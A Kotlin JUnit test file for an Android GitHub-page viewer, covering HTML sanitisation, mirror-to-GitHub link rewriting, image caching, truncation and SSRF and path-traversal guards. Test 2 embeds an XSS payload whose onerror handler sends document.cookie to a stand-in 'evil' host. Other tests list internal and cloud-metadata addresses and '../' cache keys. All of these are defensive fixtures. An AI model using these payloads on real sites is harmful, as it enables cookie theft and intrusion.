package com.gh.dl.data

import com.gh.dl.ui.AppState
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertArrayEquals
import org.junit.Before
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * GhView「抓取后本地渲染」的纯逻辑单元测试（不联网、不涉及 WebView）。
 *
 * 样本基于实测到的真实结构（githubfast.com 与 github.com 两侧一致）：
 *  - README 正文位于 `<article class="markdown-body">` 中，由服务端渲染；
 *  - 镜像将链接改写为 `https://githubfast.com/...`、图片改写为 `https://usercontent.githubfast.com/avatars/u/…`；
 *  - 源码页逐行内容位于 `<script data-target="react-app.embeddedData">` 的 rawLines 中；
 *  - 目录页条目位于 `td .react-directory-truncate a`。
 * 上述位置一旦选取错误（如净化遗漏 script、镜像地址未折算回官方），
 * 将导致「页面空白 / 无响应 / 界面出现镜像域名」等问题，在真机上难以排查。
 */
class GhViewTest {

    /** 替换前保存原始实现，参见 [online] */
    private val defaultLoader = GhView.imageLoader

    /** 单元测试不联网：使所有取图操作直接失败，同时验证「取图失败时删除元素而非保留外链」 */
    @Before
    fun offline() {
        GhView.imageLoader = { null }
    }

    /**
     * 必须还原：imageLoader 定义于 object 上，为 JVM 级全局状态。
     * 若不还原，同一批单元测试中其他用例（如需实际联网的用例）将无法取图。
     */
    @After
    fun online() {
        GhView.imageLoader = defaultLoader
    }

    private fun repoPage(bodyHtml: String, extraHead: String = "") = """
        <html><head><title>GitHub - microsoft/vscode · GitHub</title>
        $extraHead
        <meta name="description" content="Visual Studio Code.">
        </head><body>
        <header class="Header">登录提示</header>
        <main>
          <div class="Layout-content">
            <article class="markdown-body">$bodyHtml</article>
          </div>
        </main>
        <script type="application/json">{"stargazerCount":193493,"forksCount":44771}</script>
        </body></html>
    """.trimIndent()

    /** 1. README：正文保留、标题清洗、镜像链接折算回 github.com */
    @Test
    fun readmeRendersWithLogicalLinks() {
        val raw = repoPage(
            """<h1>Awesome Python</h1>
               <p>See <a href="https://githubfast.com/vinta/awesome-python/blob/master/SPONSORSHIP.md">sponsorship</a>
               and <a href="/vinta/awesome-python/tree/master/docs">docs</a>
               and <a href="blob/master/README.md">self</a>
               and <a href="https://awesome-python.com/">external site</a>.</p>"""
        )
        val p = GhView.render("https://github.com/vinta/awesome-python", raw, "经镜像加速")
        val html = p.html

        assertTrue("标题应去除 GitHub 前后缀", p.title == "Awesome Python" || html.contains("Awesome Python"))
        assertTrue("README 正文应保留", html.contains("Awesome Python"))
        assertTrue("正文中的相对链接应补全为仓库根地址",
            html.contains("https://github.com/vinta/awesome-python/blob/master/SPONSORSHIP.md"))
        assertTrue("站内绝对链接应折算回官方域名",
            html.contains("https://github.com/vinta/awesome-python/tree/master/docs"))
        assertTrue("README 中的裸相对路径应按仓库根解析",
            html.contains("https://github.com/vinta/awesome-python/blob/master/README.md"))
        assertTrue("外部站点链接应保持原样", html.contains("https://awesome-python.com/"))
        assertFalse("界面中不应出现镜像域名", html.contains("githubfast.com"))
        assertFalse("页头导航不应被引入", html.contains("登录提示"))
    }

    /** 2. 不可信内容必须净化：脚本、事件属性、javascript: 链接均不得出现在最终页面 */
    @Test
    fun hostileReadmeIsSanitized() {
        val raw = repoPage(
            """<p>正常文字</p>
               <script>alert(1)</script>
               <img src="https://github.com/a/b/x.png" onerror="fetch('https://evil/?c='+document.cookie)">
               <a href="javascript:alert(2)">点我</a>
               <iframe src="https://evil.example/"></iframe>"""
        )
        val html = GhView.render("https://github.com/a/b", raw, "直连 GitHub").html
        assertFalse("script 标签必须被移除", html.contains("<script"))
        assertFalse("on* 事件属性必须被移除", html.contains("onerror"))
        assertFalse("javascript: 链接必须被移除", html.contains("javascript:"))
        assertFalse("iframe 必须被移除", html.contains("<iframe"))
        // 抓取阶段样本中无可取图片（图片均由应用自行获取，获取失败则删除），因此不应保留外链
        assertFalse("获取失败的图片不应保留会联网的地址", html.contains("evil.example"))
        assertTrue("正文应保留", html.contains("正常文字"))
    }

    /** 3. 无 README 的仓库页取整块 main，但脚本与提示条仍被清除 */
    @Test
    fun fallsBackToMainWithoutReadme() {
        val raw = """
            <html><head><title>Files · main · octocat/Hello-World · GitHub</title></head>
            <body><main>
              <div class="Box">
                <div class="flash">这个仓库还没提交 README</div>
                <p class="notice-text">仓库概览文字</p>
                <script>track()</script>
              </div>
            </main></body></html>
        """.trimIndent()
        val html = GhView.render("https://github.com/octocat/Hello-World", raw, "直连 GitHub").html
        assertTrue("回退时应保留正文", html.contains("仓库概览文字"))
        assertFalse("提示条不应占据界面空间", html.contains("这个仓库还没提交 README"))
        assertFalse("脚本必须被清除", html.contains("<script"))
    }

    /** 4. 目录页：条目名与链接排成列表，目录项带斜杠 */
    @Test
    fun directoryPageBecomesList() {
        val raw = """
            <html><head><title>vscode/.github at main</title></head><body><main>
              <table><tbody>
                <tr><td><div class="react-directory-truncate">
                  <a href="/microsoft/vscode/tree/main/.github/ISSUE_TEMPLATE" aria-label="app, (Directory)">app</a>
                </div></td></tr>
                <tr><td><div class="react-directory-truncate">
                  <a href="/microsoft/vscode/blob/main/.github/CODEOWNERS" aria-label="CODEOWNERS, (File)">CODEOWNERS</a>
                </div></td></tr>
              </tbody></table>
            </main></body></html>
        """.trimIndent()
        val html = GhView.render("https://github.com/microsoft/vscode/tree/main/.github", raw, "经镜像加速").html
        assertTrue("目录项应保留", html.contains("app/"))
        assertTrue("文件项应保留", html.contains("CODEOWNERS"))
        assertTrue("目录链接应保留完整路径",
            html.contains("https://github.com/microsoft/vscode/tree/main/.github/ISSUE_TEMPLATE"))
        assertTrue("列表样式类应出现", html.contains("dirlist"))
    }

    /** 5. 源码页：从同页 JSON 的 rawLines 提取逐行内容（基于实测结构） */
    @Test
    fun codePageUsesRawLines() {
        val json = """{"payload":{"codeViewBlobLayoutRoute.StyledBlob":{"rawLines":["MIT License","","Copyright (c) 2015 - present Microsoft Corporation"]}}}"""
        val raw = """
            <html><head><title>LICENSE.txt at main · microsoft/vscode · GitHub</title></head>
            <body><main><div class="Box"><pre>占位</pre></div></main>
            <script type="application/json" data-target="react-app.embeddedData">$json</script>
            </body></html>
        """.trimIndent()
        val html = GhView.render("https://github.com/microsoft/vscode/blob/main/LICENSE.txt", raw, "直连 GitHub").html
        assertTrue("逐行正文应被提取", html.contains("MIT License"))
        assertTrue("空行也应保留", html.contains("Copyright (c) 2015 - present Microsoft Corporation"))
        assertTrue("应包装为代码块", html.contains("pre class=\"code\""))
        assertFalse("HTML 中的占位 pre 不应被使用", html.contains("占位"))
    }

    /** 6. stars / forks / 描述等元信息从实测位置提取 */
    @Test
    fun extractsRepoMeta() {
        val raw = repoPage(
            "<p>x</p>",
            """<meta property="og:description" content="Visual Studio Code. Contribute to microsoft/vscode development.">"""
        )
        val html = GhView.render("https://github.com/microsoft/vscode", raw, "经镜像加速").html
        assertTrue("星数应显示", html.contains("193493"))
        assertTrue("分支数应显示", html.contains("44771"))
        assertTrue("描述应显示", html.contains("Visual Studio Code"))
        // 获取状态不写入文档正文：顶栏已显示同一信息，重复输出表现为页面上方多出一段文字
        assertFalse("正文不应重复输出获取状态", html.contains("经镜像加速"))
        assertTrue("获取状态仍由 Page.note 传出",
            GhView.render("https://github.com/microsoft/vscode", raw, "经镜像加速").note.contains("经镜像加速"))
        // 镜像与官方页面均无 primaryLanguage / datetime 字段时不显示该项，不编造数据
    }

    /** 7. 镜像资产域 → 官方地址（每条均为实测换算结果） */
    @Test
    fun mirrorUrlsMapBackToOfficial() {
        assertEquals("https://github.com/vinta/awesome-python",
            GhView.toLogical("https://githubfast.com/vinta/awesome-python"))
        assertEquals("https://github.com/a/b?x=1",
            GhView.toLogical("https://githubfast.com/a/b?x=1"))
        // usercontent 将原域名首段写入路径，折算回时需移除该段
        assertEquals("https://avatars.githubusercontent.com/u/6154722?s=60&v=4",
            GhView.toLogical("https://usercontent.githubfast.com/avatars/u/6154722?s=60&v=4"))
        assertEquals("https://camo.githubusercontent.com/e033a5/687474",
            GhView.toLogical("https://usercontent.githubfast.com/camo/e033a5/687474"))
        assertEquals("https://github.githubassets.com/assets/foo-1.js",
            GhView.toLogical("https://assets.githubfast.com/assets/foo-1.js"))
        assertEquals("https://github.githubassets.com/images/foo.png",
            GhView.toLogical("https://usercontent.githubfast.com/assets/images/foo.png"))
        // 镜像的通用外站通道
        assertEquals("https://img.shields.io/badge/a-b-green",
            GhView.toLogical("https://external.githubfast.com/https/img.shields.io/badge/a-b-green"))
        // 非镜像地址原样返回
        assertEquals("https://github.com/a/b", GhView.toLogical("https://github.com/a/b"))
        assertEquals("https://example.com/x", GhView.toLogical("https://example.com/x"))
    }

    /** 8. 反向映射：官方地址 → 镜像通道（取图备用），无法识别时返回 null */
    @Test
    fun mirrorFallbackPaths() {
        assertEquals("https://githubfast.com/a/b", GhView.mirrorOf("https://github.com/a/b"))
        assertEquals("https://githubfast.com/a/b/raw/main/x.png",
            GhView.mirrorOf("https://raw.githubusercontent.com/a/b/main/x.png"))
        assertEquals("https://usercontent.githubfast.com/avatars/u/905434?s=60",
            GhView.mirrorOf("https://avatars.githubusercontent.com/u/905434?s=60"))
        assertEquals("https://assets.githubfast.com/assets/foo.js",
            GhView.mirrorOf("https://github.githubassets.com/assets/foo.js"))
        // 外站与第三方托管无「githubfast 对应关系」，不应强制映射
        assertTrue(GhView.mirrorOf("https://img.shields.io/badge?x=1") == null)
        assertTrue(GhView.mirrorOf("https://gitee.com/a/b") == null)
    }

    /** 9. 相对链接基准：README 中的写法应相对仓库根，而非当前 tree 目录 */
    @Test
    fun resolvesAgainstRepoRoot() {
        assertEquals("https://github.com/a/b", GhView.repoRoot("https://github.com/a/b"))
        // 含 tree/分支/目录的页面也应折算至仓库根：README 中的相对写法本就相对仓库根
        assertEquals("https://github.com/a/b", GhView.repoRoot("https://github.com/a/b/tree/main/docs"))
        // 文件页同样折算至仓库根，使 README 中 "blob/main/x.py" 能正确指向
        assertEquals("https://github.com/a/b", GhView.repoRoot("https://github.com/a/b/blob/main/x.py"))
        assertEquals("https://github.com/a", GhView.repoRoot("https://github.com/a"))
        assertEquals("https://github.com", GhView.repoRoot("https://github.com/"))

        assertEquals("https://github.com/a/b/blob/main/x.py",
            GhView.resolveRef("blob/main/x.py", "https://github.com/a/b"))
        assertEquals("https://github.com/login?return_to=x",
            GhView.resolveRef("/login?return_to=x", "https://githubfast.com/a/b"))
        assertEquals("https://github.com/a/b/docs/x.png",
            GhView.resolveRef("./docs/x.png", "https://github.com/a/b"))
        assertEquals("mailto:a@b.c", GhView.resolveRef("mailto:a@b.c", "https://github.com/a/b"))
    }

    /** 10. 净化器本身：白名单外的内容一律移除 */
    @Test
    fun sanitizerDropsDangerousStuff() {
        val out = Sanitize.html(
            "<p onclick=\"x()\">hi</p><script>alert(1)</script>" +
                "<a href=\"javascript:alert(2)\">l</a><div>ok<b>b</b>" +
                "<img src=\"https://github.com/a/b.png\"></div>"
        )
        assertFalse(out.contains("onclick"))
        assertFalse(out.contains("<script"))
        assertFalse(out.contains("javascript:"))
        assertTrue(out.contains("hi"))
        assertTrue(out.contains("<b>b</b>"))
        assertTrue("图片地址应原样保留（由取图阶段处理）", out.contains("https://github.com/a/b.png"))
    }

    /**
     * 11. 超长正文按**元素**边界截断，不得切入 base64 图片中间。
     * 真机截图中出现的「破图 + 正文过长已截断」即源于此：
     * 旧实现先内联图片再对整段字符串执行 substring，恰好切在 data: URI 内部。
     */
    @Test
    fun truncationNeverSplitsAnInlinedImage() {
        val big = "A".repeat(4000)
        val uri = "data:image/png;base64,$big"
        val body = org.jsoup.nodes.Element("div")
        // README 实际结构即为此形式：正文整块位于一个子元素中，图片分散于其内部
        body.append(
            "<article>" +
                "<p><img src=\"$uri\"></p>" +
                "<p><img src=\"$uri\"></p>" +
                "<p>tail</p>" +
                "</article>"
        )
        val cut = GhView.truncateToBudget(body, 5000, 0)
        val html = body.html()
        assertTrue("超出预算必须判定为已截断", cut)
        // 保留的图片必须为完整 URI（要么完整保留，要么完整移除，不得截断）
        assertTrue("保留的图片必须完整", html.contains("$uri\""))
        val complete = Regex("base64," + big + "\"").findAll(html).count()
        assertEquals("每条 data: URI 必须完整闭合", complete, Regex("data:image/png").findAll(html).count())
        assertTrue("超出预算的尾部应被丢弃", !html.contains("tail"))
    }

    /** 12. 预算内的页面不做处理，也不添加提示 */
    @Test
    fun shortBodyIsLeftAlone() {
        val body = org.jsoup.nodes.Element("div")
        body.append("<p>hello</p>")
        assertFalse(GhView.truncateToBudget(body, 10_000, 0))
        assertEquals("<p>hello</p>", body.html())
    }

    /** 13. 两档加速互相独立：下载开关不影响浏览抓取地址，反之亦然 */
    @Test
    fun downloadAndBrowseAccelAreIndependent() {
        val dl = AppState.accelOn
        val br = AppState.browseAccelOn
        val mirrors = GhView.pageMirrors
        try {
            GhView.applyMirrors(listOf("https://mirror.example"))
            AppState.accelOn = true
            AppState.browseAccelOn = false
            // 仅开启下载加速：浏览仍保持直连，不得将文件前缀拼接到网页
            assertEquals(listOf("https://github.com/a/b"), GhView.candidates("https://github.com/a/b"))
            AppState.accelOn = false
            AppState.browseAccelOn = true
            val both = GhView.candidates("https://github.com/a/b")
            assertEquals(2, both.size)
            assertEquals("https://mirror.example/a/b", both[0])
            assertEquals("https://github.com/a/b", both[1])
            // 非 GitHub 地址一律不改写
            assertEquals(listOf("https://gitee.com/a/b"), GhView.candidates("https://gitee.com/a/b"))
        } finally {
            AppState.accelOn = dl
            AppState.browseAccelOn = br
            GhView.pageMirrors = mirrors
        }
    }

    /** 14. 用户自定义镜像站后，地址折算应随之更换后缀（不得继续按 githubfast 硬编码） */
    @Test
    fun mirrorMappingFollowsConfiguredList() {
        val mirrors = GhView.pageMirrors
        try {
            // 空列表表示未自定义，回退至内置镜像
            GhView.applyMirrors(emptyList())
            assertEquals("https://githubfast.com/a/b", GhView.mirrorOf("https://github.com/a/b"))
            assertEquals("https://github.com/a/b", GhView.toLogical("https://githubfast.com/a/b"))

            GhView.applyMirrors(listOf("https://my.mirror.example/"))
            assertEquals("https://my.mirror.example/a/b", GhView.mirrorOf("https://github.com/a/b"))
            assertEquals("https://github.com/a/b", GhView.toLogical("https://my.mirror.example/a/b"))
            assertEquals(
                "https://avatars.githubusercontent.com/u/1",
                GhView.toLogical("https://usercontent.my.mirror.example/avatars/u/1")
            )
            // 更换镜像站后，旧站地址不再被识别为镜像（避免误判）
            assertEquals("https://githubfast.com/a/b", GhView.toLogical("https://githubfast.com/a/b"))
        } finally {
            GhView.pageMirrors = mirrors
        }
    }

    /** 15. 镜像站列表输入解析：去除尾部斜杠、去除空行、去重、非 http(s) 协议一律过滤 */
    @Test
    fun mirrorInputIsCleaned() {
        assertEquals(
            listOf("https://a.example", "http://b.example/x"),
            GhView.parseMirrors(
                "  https://a.example/  \n\nhttps://a.example/\n" +
                    "b.example\nhttp://b.example/x/\n# comment"
            )
        )
    }

    // ---- 图片策略 / 解析引擎 ----

    /** 保存本组测试需修改的三个全局状态，各用例自行还原 */
    private fun withImageMode(mode: String, block: () -> Unit) {
        val old = AppState.imageMode
        try { AppState.imageMode = mode; block() } finally { AppState.imageMode = old }
    }

    private fun <T> withEngine(engine: String, block: () -> T): T {
        val old = AppState.parseEngine
        // 此前此处遗漏赋值，导致 22 号用例实际运行于默认引擎仍能通过——
        // 「测试无效」比不测更糟，补充赋值，并断言确实切换至目标引擎
        AppState.parseEngine = engine
        try {
            if (engine != GhView.ENGINE_JSOUP) assertEquals(engine, AppState.parseEngine)
            return block()
        } finally {
            AppState.parseEngine = old
        }
    }

    /**
     * 16. 默认（本地缓存）模式：图片替换为虚拟地址，**页面中不保留原始图片 URL**，
     * 也不再生成 base64——这正是「内容过长」提示的根本原因。
     */
    @Test
    fun localImageModeKeepsBodySmallAndLeavesNoExternalUrl() {
        val raw = repoPage("<p>正文</p><img src=\"https://github.com/a/b/shot.png\">")
        withImageMode(GhView.IMAGE_LOCAL) {
            val html = GhView.render("https://github.com/a/b", raw, "经镜像加速").html
            assertTrue("应替换为虚拟地址", html.contains("https://" + GhView.IMG_HOST + "/"))
            assertFalse("不应保留会联网的图片地址", html.contains("shot.png"))
            assertFalse("不应存在 base64 内联", html.contains("data:image"))
            assertFalse("正文不应被截断", html.contains("内容过长"))
        }
    }

    /** 17. 虚拟地址必须能反查至真实候选，否则界面无法取图（等同于全部破图） */
    @Test
    fun localImageKeyResolvesBackToCandidates() {
        val raw = repoPage("<img src=\"https://github.com/a/b/shot.png\">")
        withImageMode(GhView.IMAGE_LOCAL) {
            val html = GhView.render("https://github.com/a/b", raw, "经镜像加速").html
            val key = Regex("https://" + GhView.IMG_HOST + "/([0-9a-f]+)").find(html)!!.groupValues[1]
            val cands = GhView.candidatesFor(key)
            assertTrue("候选中必须包含官方地址", cands.contains("https://github.com/a/b/shot.png"))
            assertTrue("候选中必须包含镜像地址", cands.any { it.contains("githubfast.com") })
        }
    }

    /** 18. 「不显示图片」模式：不保留任何 <img> 元素 */
    @Test
    fun imageOffDropsEveryImg() {
        val raw = repoPage("<p>x</p><img src=\"https://github.com/a/b/1.png\"><img src=\"https://github.com/a/b/2.png\">")
        withImageMode(GhView.IMAGE_OFF) {
            val html = GhView.render("https://github.com/a/b", raw, "直连 GitHub").html
            assertEquals(0, Regex("<img").findAll(html).count())
            assertTrue("正文仍应保留", html.contains(">x<"))
        }
    }

    /** 19. 「内联」模式保留原有行为：获取成功才转换为 data:，获取失败则删除（不保留外链） */
    @Test
    fun base64ModeStillDropsUnfetchableImages() {
        val raw = repoPage("<img src=\"https://github.com/a/b/1.png\">")
        val old = GhView.imageLoader
        try {
            withImageMode(GhView.IMAGE_BASE64) {
                GhView.imageLoader = { null }
                val miss = GhView.render("https://github.com/a/b", raw, "直连 GitHub").html
                assertEquals("获取失败必须删除", 0, Regex("<img").findAll(miss).count())

                GhView.imageLoader = { byteArrayOf(0x89.toByte(), 'P'.code.toByte()) to "image/png" }
                val hit = GhView.render("https://github.com/a/b", raw, "直连 GitHub").html
                assertTrue("获取成功才内联", hit.contains("data:image/png;base64,"))
            }
        } finally {
            GhView.imageLoader = old
        }
    }

    /** 20. 四档引擎均应能解析正常页与畸形页，且均能获取正文（失败时内部回退至默认档） */
    @Test
    fun everyEngineHandlesNormalAndMalformed() {
        val normal = repoPage("<h1>T</h1><p>body</p>")
        // 故意构造畸形：不闭合 article、未转义的 <、多余的闭合标签
        val malformed = normal.replace("</article>", "")
            .replace("<p>body</p>", "<p>body a < b & c</p></div></span>")
        for ((id, _) in GhView.ENGINES) {
            for ((tag, src) in listOf("正常" to normal, "畸形" to malformed)) {
                val doc = GhView.parseDoc(src, "https://github.com/a/b", id)
                val art = doc.selectFirst("article.markdown-body")
                // 注意 ${tag} 需带花括号：中文字符为合法标识符字符，"$tag页" 会被解析为 tag页
                assertTrue("$id 引擎在${tag}页取不到正文", art != null)
                assertTrue("$id 引擎在${tag}页正文丢了", art!!.text().contains("body"))
            }
        }
    }

    /** 21. 「只解析正文」模式：能定位则裁剪，无法定位必须返回 null（错误裁剪比不裁剪更严重） */
    @Test
    fun articleSliceOnlyCutsWhenPairingIsClear() {
        val raw = repoPage("<p>正文在这里</p>")
        val cut = GhView.articleSlice(raw)
        assertTrue("应裁剪至正文", cut != null && cut.contains("正文在这里"))
        assertTrue("裁剪结果必须为自包含的 article",
            cut!!.startsWith("<article") && cut.endsWith("</article>"))
        assertTrue("不应引入整页脚本 JSON", !cut.contains("stargazerCount"))
        assertTrue("无正文的页面应返回 null", GhView.articleSlice("<html><body><main>x</main></body></html>") == null)
    }

    /** 22. 切片模式整条链路应仍可用：正文、元信息、链接折算均不得缺失 */
    @Test
    fun fastEngineStillRendersFullPage() {
        val raw = repoPage("<p>See <a href=\"/a/b/tree/main/docs\">docs</a></p>")
        withEngine(GhView.ENGINE_FAST) {
            val html = GhView.render("https://github.com/a/b", raw, "经镜像加速").html
            assertTrue("正文应存在", html.contains("docs"))
            assertTrue("链接应折算为官方地址", html.contains("https://github.com/a/b/tree/main/docs"))
            assertTrue("星数（仅能通过正则获取）也应存在", html.contains("193493"))
            assertTrue("标题不应因切片而丢失", html.contains("vscode"))
        }
    }

    /** 23. SSRF：非点分写法的内网地址也必须拦截（此为 curl/wget 唯一的安全护栏） */
    @Test
    fun ssrfGuardCoversAlternateIpLiteralForms() {
        val blocked = listOf(
            "https://127.0.0.1/x.png",
            "https://10.1.2.3/x.png",
            "https://192.168.1.1/x.png",
            "https://172.16.0.1/x.png",
            "https://169.254.169.254/latest/meta-data",  // 云元数据端点
            "https://localhost/x.png",
            "https://anything.local/x.png",
            "https://2130706433/x.png",     // 等价于 127.0.0.1 的十进制写法
            "https://0x7f000001/x.png",     // 等价于 127.0.0.1 的十六进制写法
            "https://[::1]/x.png",          // IPv6 回环地址
            "https://[fd00::1]/x.png",      // IPv6 ULA 地址
            "https://[fe80::1]/x.png",      // IPv6 链路本地地址
            "https://[::ffff:127.0.0.1]/x.png" // IPv4 映射地址
        )
        for (u in blocked) assertFalse("$u 应被拦截", GhView.isPublicHost(u))
        val allowed = listOf(
            "https://github.com/a/b/1.png",
            "https://raw.githubusercontent.com/a/b/1.png",
            "https://img.shields.io/badge/x.svg",
            "https://8.8.8.8/x.png"          // 公网 IP 字面量不应被误拦截
        )
        for (u in allowed) assertTrue("$u 不应被拦截", GhView.isPublicHost(u))
    }

    /** 24. 图片缓存：写入后应能读回，且读回的为**实际 MIME**（此前返回的是扩展名） */
    @Test
    fun imageCacheRoundTripsWithRealMime() {
        val dir = java.nio.file.Files.createTempDirectory("ghimg-test").toFile()
        val old = GhView.imageCacheDir
        val png = byteArrayOf(0x89.toByte(), 'P'.code.toByte(), 'N'.code.toByte(), 'G'.code.toByte(),
            0x0D, 0x0A, 0x1A, 0x0A, 1, 2, 3)
        try {
            GhView.imageCacheDir = dir
            val key = "0123456789abcdef"
            val loader = GhView.imageLoader
            val cands = listOf("https://github.com/a/b/shot.png")
            GhView.rememberCandidatesForTest(key, cands)
            GhView.imageLoader = { png to "image/png" }
            try {
                val first = GhView.loadImage(key)
                assertTrue("首次调用应实际获取到数据", first != null)
                assertEquals("image/png", first!!.second)
                val second = GhView.loadImage(key)
                assertTrue("第二次调用应命中缓存", second != null)
                assertArrayEquals(png, second!!.first)
            } finally {
                GhView.imageLoader = loader
            }
        } finally {
            GhView.imageCacheDir = old
            dir.deleteRecursively()
        }
    }

    /** 25. 缓存中的损坏文件（截断 / 内容与格式不符）必须被识别并删除，不得提供给 WebView */
    @Test
    fun corruptCacheFileIsRejectedAndDeleted() {
        val dir = java.nio.file.Files.createTempDirectory("ghimg-bad").toFile()
        val old = GhView.imageCacheDir
        try {
            GhView.imageCacheDir = dir
            dir.mkdirs()
            // 文件名为 png，内容却为半截 HTML——此前此类文件会被直接作为图片返回给 WebView
            val bogus = java.io.File(dir, "0123456789abcdef.png")
            bogus.writeText("<html><body>not an image at all")
            val key = "0123456789abcdef"
            val loader = GhView.imageLoader
            GhView.rememberCandidatesForTest(key, listOf("https://github.com/a/b/shot.png"))
            GhView.imageLoader = { null }   // 取图也失败：证明「未将损坏文件作为结果返回」
            try {
                assertTrue("损坏缓存不得作为图片返回", GhView.loadImage(key) == null)
                assertTrue("损坏文件应被删除", !bogus.exists())
            } finally {
                GhView.imageLoader = loader
            }
        } finally {
            GhView.imageCacheDir = old
            dir.deleteRecursively()
        }
    }

    /** 26. key 必须为纯十六进制短串：包含 / 或 .. 的一律拒绝，防止目录穿越攻击 */
    @Test
    fun imageCacheKeyIsValidated() {
        val dir = java.nio.file.Files.createTempDirectory("ghimg-key").toFile()
        val old = GhView.imageCacheDir
        try {
            GhView.imageCacheDir = dir
            for (evil in listOf("../../files/x", "abc/../..", "", "ZzZzZzZz", "0123456789abcdefgh")) {
                GhView.rememberCandidatesForTest(evil, listOf("https://github.com/a/b/1.png"))
                val loader = GhView.imageLoader
                GhView.imageLoader = { byteArrayOf(0x89.toByte(), 'P'.code.toByte()) to "image/png" }
                try {
                    GhView.loadImage(evil)
                } finally {
                    GhView.imageLoader = loader
                }
                assertEquals("非法 key 不应在缓存目录中留下任何文件：$evil", 0, dir.listFiles()?.size ?: -1)
            }
        } finally {
            GhView.imageCacheDir = old
            dir.deleteRecursively()
        }
    }

    /** 27. 命中页面缓存时不得发起任何网络请求（更换引擎/图片方式的真实路径） */
    @Test
    fun engineChangeReusesCachedRawHtmlWithoutAnyNetwork() {
        val raw = repoPage("<p>正文</p><img src=\"https://github.com/a/b/shot.png\">")
        val u = "https://github.com/a/b"
        val oldAccel = AppState.browseAccelOn
        val oldFetcher = AppState.fetcher
        val oldMode = AppState.imageMode
        val oldEngine = AppState.parseEngine
        try {
            // 确保「若走联网路径」必然失败：关闭加速、取图全部失败，
            // 使仅有命中缓存时才能成功，确保测试结果的真实性
            AppState.browseAccelOn = false
            AppState.fetcher = Fetcher.OKHTTP
            GhView.imageLoader = { null }
            GhView.clearRawCache()
            GhView.primeRawCacheForTest(u, raw, false)
            val a = GhView.fetch(u)
            assertTrue("默认模式应输出正文", a.html.contains("正文"))
            assertTrue("命中缓存应在页脚注明（用户可见的凭证）", a.note.contains("复用页面缓存"))
            val b = withEngine(GhView.ENGINE_FAST) { GhView.fetch(u) }
            assertTrue("切片模式也应复用同一条缓存", b.note.contains("复用页面缓存"))
            assertTrue("切片模式正文应存在", b.html.contains("正文"))
            assertTrue("切片模式图片仍使用虚拟地址", b.html.contains("https://" + GhView.IMG_HOST + "/"))
            assertFalse("界面中不应出现镜像域名", b.html.contains("githubfast.com"))
        } finally {
            AppState.browseAccelOn = oldAccel
            AppState.fetcher = oldFetcher
            AppState.imageMode = oldMode
            AppState.parseEngine = oldEngine
            GhView.clearRawCache()
        }
    }

    /** 28. 缓存键仅包含「影响获取哪份网络内容」的项，更换引擎/图片方式必须命中同一条缓存 */
    @Test
    fun rawCacheKeyFollowsNetOptionsOnly() {
        val oldAccel = AppState.browseAccelOn
        val oldFetcher = AppState.fetcher
        val oldEngine = AppState.parseEngine
        val oldMode = AppState.imageMode
        try {
            val u = "https://github.com/a/b"
            val k1 = GhView.rawCacheKey(u)
            AppState.parseEngine = GhView.ENGINE_XML
            AppState.imageMode = GhView.IMAGE_BASE64
            assertEquals("更换引擎/图片方式必须命中同一条缓存（否则即为重复联网）", k1, GhView.rawCacheKey(u))
            AppState.browseAccelOn = !oldAccel
            assertNotEquals("更换加速开关必须更换键（获取的网络内容不同）", k1, GhView.rawCacheKey(u))
            AppState.browseAccelOn = oldAccel
            AppState.fetcher = Fetcher.CURL
            assertNotEquals("更换抓取器必须更换键", k1, GhView.rawCacheKey(u))
        } finally {
            AppState.browseAccelOn = oldAccel
            AppState.fetcher = oldFetcher
            AppState.parseEngine = oldEngine
            AppState.imageMode = oldMode
        }
    }
}
